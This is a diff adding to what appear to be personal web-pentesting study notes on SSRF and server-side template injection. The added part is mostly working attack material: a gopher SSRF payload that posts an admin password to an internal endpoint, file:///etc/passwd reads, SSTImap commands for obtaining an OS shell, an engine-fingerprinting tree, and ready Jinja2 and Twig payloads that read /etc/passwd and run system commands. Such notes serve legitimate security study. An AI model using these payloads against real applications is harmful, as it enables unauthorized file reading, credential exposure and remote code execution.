@@ -148,6 +148,81 @@ which is not avaiable
   -s | awk '{print $1}'
 -> to display whic are avaiable
 ->https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+
+Exploitation:internal portscan by accessing ports on localhost accessing restricted endpoints
+Protocols: http://127.0.0.1/, file:///etc/passwd
+gopher://<internal URL with :port>/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent
+Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
 ________________________________________________________________________________________________________________
+ SSTI
+ Exploitation : Templating Engines are used to dynamically generate content
+ Test String:  ${{<%[%'"}}%\.
+ SSTI Tools : download a remote file to our local machine ( -D '/etc/passwd' './passwd'), 
+              we can execute a system command using the -S flag (-S id)
+               we can use --os-shell to obtain an interactive shell: --os-shell
+   git clone https://github.com/vladko312/SSTImap
+   cd SSTImap
+   pip3 install -r requirements.txt
+   python3 sstimap.py -u http://172.17.0.2/index.php?name=test
+   
 
 
+                            ┌─────────────┐
+                            │   ${7*7}    │
+                            └──────┬──────┘
+                                   │
+                    ┌──────────────┴──────────────┐
+                    │                             │
+             ┌──────▼──────┐               ┌──────▼──────┐
+             │ a{*comment*}b│              │   {{7*7}}   │
+             └──────┬──────┘               └──────┬──────┘
+                    │                             │
+         ┌──────────┴──────────┐         ┌────────┴────────┐
+         │                     │         │                 │
+ ┌───────▼───────┐      ┌──────▼──────┐  │         ┌───────▼────────┐
+ │    Smarty     │      │${'z'.join('ab')}│         │   Not Vulnerable │
+ └───────────────┘      └──────┬──────┘  │         └─────────────────┘
+                               │         │
+                      ┌────────┴───────┐ │
+                      │                │ │
+                ┌─────▼─────┐   ┌──────▼──────┐
+                │   Mako    │   │   Unknown   │
+                └───────────┘   └─────────────┘
+
+                              │
+                     ┌────────▼────────┐
+                     │     {{7*7}}     │
+                     └────────┬────────┘
+                              │
+                 ┌────────────┴────────────┐
+                 │                         │
+           ┌─────▼──────┐           ┌──────▼──────┐
+           │   Jinja2   │           │    Twig     │
+           └────────────┘           └─────────────┘
+For Jinja2 the payload {{7*'7'}}  the result will be 7777777 if its 49 then its Twig
+
+Exploiting SSTI - Jinja2
+-> Python web frameworks such as Flask or Django, Flask web application
+->  We can also execute Python code to obtain information about the web application's source code
+-> Payload
+   {{ config.items() }} ->  obtain internal information about the web application, dumps the entire web application configuration
+   {{ self.__init__.__globals__.__builtins__ }} -> dump all available built-in functions
+   {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }} -> LFI,  we cannot call the function directly; we need 
+                                                                              to call it from the __builtins__ dictionary we dumped earlier
+-> Remote Code Execution (RCE)
+To achieve remote code execution in Python, we can use functions provided by the os library, such as system or popen. However, 
+if the web application has not already imported this library, we must first import it by calling the built-in function import. 
+This results in the following SSTI payload:
+ {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+in place of id we change to other command like
+ls -R / -> Listing
+pwd, ls -la etc other command too
+
+Exploiting SSTI - Twig
+-> Twig is a template engine for the PHP programming language.
+-> Payload 
+   {{ _self }} -> Information Disclose
+   {{ "/etc/passwd"|file_excerpt(1,-1) }} - LFI
+   {{ ['id'] | filter('system') }} - RCE -  use a PHP built-in function such as system. We can pass an argument to this function by using Twig's filter function
+in place id replace with linux command like ls -la, cat etc
+SSTI Tools
